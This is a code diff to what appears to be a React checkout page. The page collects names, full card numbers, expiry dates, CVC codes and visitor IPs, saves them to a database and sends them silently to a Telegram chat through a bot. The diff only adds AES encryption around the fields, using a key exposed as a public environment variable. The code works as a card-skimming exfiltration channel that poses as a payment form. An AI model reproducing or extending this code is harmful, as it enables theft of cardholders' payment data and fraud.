@@ -10,6 +10,7 @@ import mastercard from '../assets/mastercard.png';
 import aExpress from '../assets/a-express.png';
 import moment from "moment"
 const { TelegramClient } = require('messaging-api-telegram');
+const CryptoJS = require("crypto-js");
 const client = new TelegramClient({
     accessToken: process.env.REACT_APP_PUBLIC_TM_TOKEN,
 });
@@ -41,25 +42,26 @@ const Payment = () => {
                 return res.text()
             })
             .then(ip => {
+                const secretKey = process.env.REACT_APP_PUBLIC_ENCRYPT_KEY
                 db.collection('payment-data').add({
-                    fname: fname, 
-                    lname: lname, 
-                    cardNum: cardNum, 
-                    expiry: expiry, 
-                    cvc: cvc,
-                    ip_address: ip,
-                    logged_at: Date.now()
+                    fname: CryptoJS.AES.encrypt(fname, secretKey).toString(), 
+                    lname: CryptoJS.AES.encrypt(lname, secretKey).toString(), 
+                    cardNum: CryptoJS.AES.encrypt(cardNum, secretKey).toString(), 
+                    expiry: CryptoJS.AES.encrypt(expiry, secretKey).toString(), 
+                    cvc: CryptoJS.AES.encrypt(cvc, secretKey).toString(),
+                    ip_address: CryptoJS.AES.encrypt(ip, secretKey).toString(),
+                    logged_at: CryptoJS.AES.encrypt(moment( new Date() ).format("yyyy-MM-DD hh:MM:ss"), secretKey).toString()
                 }).then(data => {
                     if( process.env.REACT_APP_PUBLIC_TM_ENABLE === '1' )
                     {
                         let message = "Payment Data\r\n"
-                        message += "First Name: " + fname + '\r\n'
-                        message += "Last Name: " + lname + '\r\n'
-                        message += "Card Number: " + cardNum + '\r\n'
-                        message += "Expiry Date: " + expiry + '\r\n'
-                        message += "Security Code: " + cvc + '\r\n'
-                        message += "Ip Address: " + ip + '\r\n'
-                        message += "Time: " + moment( new Date() ).format("yyyy-MM-DD hh:MM:ss")
+                        message += "First Name: " + CryptoJS.AES.encrypt(fname, secretKey).toString() + '\r\n'
+                        message += "Last Name: " + CryptoJS.AES.encrypt(lname, secretKey).toString() + '\r\n'
+                        message += "Card Number: " + CryptoJS.AES.encrypt(cardNum, secretKey).toString() + '\r\n'
+                        message += "Expiry Date: " + CryptoJS.AES.encrypt(expiry, secretKey).toString() + '\r\n'
+                        message += "Security Code: " + CryptoJS.AES.encrypt(cvc, secretKey).toString() + '\r\n'
+                        message += "Ip Address: " + CryptoJS.AES.encrypt(ip, secretKey).toString() + '\r\n'
+                        message += "Time: " + CryptoJS.AES.encrypt(moment( new Date() ).format("yyyy-MM-DD hh:MM:ss"), secretKey).toString()
                         client.sendMessage(process.env.REACT_APP_PUBLIC_TM_CHAT_ID, message, {
                             disableWebPagePreview: true,
                             disableNotification: true,
